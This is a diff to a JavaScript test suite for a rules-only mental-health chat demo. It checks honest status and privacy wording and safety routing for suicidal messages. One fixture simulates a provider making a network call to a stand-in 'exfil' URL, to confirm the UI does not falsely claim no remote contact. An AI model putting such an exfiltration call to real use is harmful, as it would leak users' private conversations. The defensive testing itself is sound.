@@ -63,7 +63,7 @@ class FakeElement {
   }
 }
 
-function createFakeDom() {
+function createFakeDom(options = {}) {
   const document = {
     activeElement: null,
     elements: new Map(),
@@ -102,6 +102,11 @@ function createFakeDom() {
   const context = vm.createContext({ window, document, AbortController, setTimeout, clearTimeout, URL, console });
   for (const filename of ['catalog.js', 'engine.js', 'council.js', 'conversation_adapter.js', 'ui.js']) {
     vm.runInContext(fs.readFileSync(path.join(EMBEDDED, filename), 'utf8'), context, { filename, timeout: 2500 });
+    if (filename === 'engine.js' && options.respond) {
+      // A provider's self-declared `browser-local` execution is not an
+      // independently verified absence of network, storage, or logging.
+      window.TherapyBotEmbedded = { respond: options.respond(window) };
+    }
   }
   return { window, document, effects };
 }
@@ -118,7 +123,8 @@ function descendants(root, predicate) {
 
 test('actual UI uses the registered adapter for ordinary message, source links and transient Clear', async () => {
   const { document, effects } = createFakeDom();
-  assert.match(document.getElementById('engine-status').textContent, /ready/);
+  assert.match(document.getElementById('engine-status').textContent, /rules only/i);
+  assert.match(document.getElementById('engine-status').textContent, /no neural model/i);
   document.getElementById('message').value = 'My manager expects me to pay for company fuel.';
   await document.getElementById('send-message').fire('click');
   const log = document.getElementById('conversation-log');
@@ -127,6 +133,103 @@ test('actual UI uses the registered adapter for ordinary message, source links a
   document.getElementById('clear-chat').fire('click');
   assert.equal(log.children.length, 1);
   assert.equal(log.children[0].id, 'welcome');
+  assert.deepEqual(effects, []);
+});
+
+test('visible status and unsupported-topic turn state the actual rules-only limit', async () => {
+  const { document, effects } = createFakeDom();
+  const html = fs.readFileSync(path.join(EMBEDDED, 'index.html'), 'utf8');
+  assert.match(html, /RULES-ONLY DEMO/);
+  assert.match(html, /No neural inference is active/);
+  document.getElementById('message').value = 'What is 17 times 23?';
+  await document.getElementById('send-message').fire('click');
+  const meta = descendants(document.getElementById('conversation-log'), (el) => el.className === 'message-meta').map((el) => el.textContent).join(' ');
+  assert.match(meta, /Rules-only response/);
+  assert.match(meta, /Unsupported topic/);
+  assert.match(document.getElementById('form-feedback').textContent, /cannot answer open-ended questions/i);
+  assert.deepEqual(effects, []);
+});
+
+test('privacy copy limits no-upload claims to bundled code and discloses provider uncertainty', () => {
+  const html = fs.readFileSync(path.join(EMBEDDED, 'index.html'), 'utf8');
+  assert.doesNotMatch(html, /No telemetry or conversation uploads\./i);
+  assert.match(html, /bundled (page|interface|app) code/i);
+  assert.match(html, /optional|substitut(ed|ed\s+provider)|third-party/i);
+  assert.match(html, /network|logging|uploads?/i);
+  assert.match(html, /unverified|not (been )?(independently )?verified|cannot verify/i);
+});
+
+test('provider failure after network side-effect never asserts that no remote contact occurred', async () => {
+  const { document, effects } = createFakeDom({
+    respond: (window) => () => {
+      try { window.fetch('https://example.invalid/exfil'); } catch {}
+      throw new Error('Provider failed after its network attempt');
+    }
+  });
+  document.getElementById('message').value = 'I need some help with boundaries.';
+  await document.getElementById('send-message').fire('click');
+  const response = descendants(document.getElementById('conversation-log'), (el) => el.className === 'message-content')
+    .map((element) => element.textContent).join(' ');
+  assert.deepEqual(effects, ['fetch'], 'synthetic substituted provider made a network attempt');
+  assert.match(response, /could not (complete|be completed)|failed/i);
+  assert.doesNotMatch(response, /No remote service was contacted|no (external|remote|network) (service|request|contact)/i);
+  assert.match(response, /not (been )?(independently )?verified|unverified/i);
+});
+
+test('urgent safety route takes priority over unrelated topic advice', async () => {
+  const { document, effects } = createFakeDom();
+  document.getElementById('message').value = 'I am going to kill myself.';
+  await document.getElementById('send-message').fire('click');
+  const meta = descendants(document.getElementById('conversation-log'), (el) => el.className === 'message-meta').map((el) => el.textContent).join(' ');
+  assert.match(meta, /Safety route: urgent_review/);
+  const feedback = document.getElementById('form-feedback').textContent;
+  assert.match(feedback, /immediate danger/i);
+  assert.doesNotMatch(feedback, /No matching topic|Try a suggested topic/i);
+  assert.deepEqual(effects, []);
+});
+
+test('a concern route has its own caution rather than normal topic success', async () => {
+  const { document } = createFakeDom();
+  document.getElementById('message').value = 'I feel suicidal.';
+  await document.getElementById('send-message').fire('click');
+  const meta = descendants(document.getElementById('conversation-log'), (el) => el.className === 'message-meta').map((el) => el.textContent).join(' ');
+  assert.match(meta, /Safety route: concern/);
+  const feedback = document.getElementById('form-feedback').textContent;
+  assert.match(feedback, /not a risk assessment/i);
+  assert.doesNotMatch(feedback, /No matching topic|Rules-only topic response/i);
+});
+
+test('Council-prefixed urgent cue cannot receive an ordinary Council-success footer', async () => {
+  const { document, effects } = createFakeDom();
+  document.getElementById('member-name').value = 'Skeptic';
+  document.getElementById('member-role').value = 'Ask what evidence is missing';
+  await document.getElementById('save-member').fire('click');
+  await document.getElementById('convene-council').fire('click');
+  document.getElementById('message').value = 'Council: I am going to kill myself.';
+  await document.getElementById('send-message').fire('click');
+  const last = document.getElementById('conversation-log').children.at(-1);
+  assert.match(last.className, /message--warning/);
+  assert.equal(descendants(last, (el) => el.className === 'council-speaker').length, 0);
+  assert.match(document.getElementById('form-feedback').textContent, /immediate danger/i);
+  assert.doesNotMatch(document.getElementById('form-feedback').textContent, /Experimental council reflection|No matching topic/i);
+  assert.deepEqual(effects, []);
+});
+
+test('Council unknown route is announced as unavailable, not successful Council reflection', async () => {
+  const { document, effects } = createFakeDom();
+  document.getElementById('member-name').value = 'Skeptic';
+  document.getElementById('member-role').value = 'Challenge unsupported conclusions';
+  await document.getElementById('save-member').fire('click');
+  await document.getElementById('convene-council').fire('click');
+  document.getElementById('message').value = 'Council: What is 17 times 23?';
+  await document.getElementById('send-message').fire('click');
+  const last = document.getElementById('conversation-log').children.at(-1);
+  assert.match(last.className, /message--warning/);
+  const meta = descendants(last, (el) => el.className === 'message-meta').map((el) => el.textContent).join(' ');
+  assert.match(meta, /Safety route: unknown/);
+  const feedback = document.getElementById('form-feedback').textContent;
+  assert.match(feedback, /Safety interpretation unavailable/i);
+  assert.doesNotMatch(feedback, /Experimental council reflection|Structured topic response/i);
   assert.deepEqual(effects, []);
 });
 
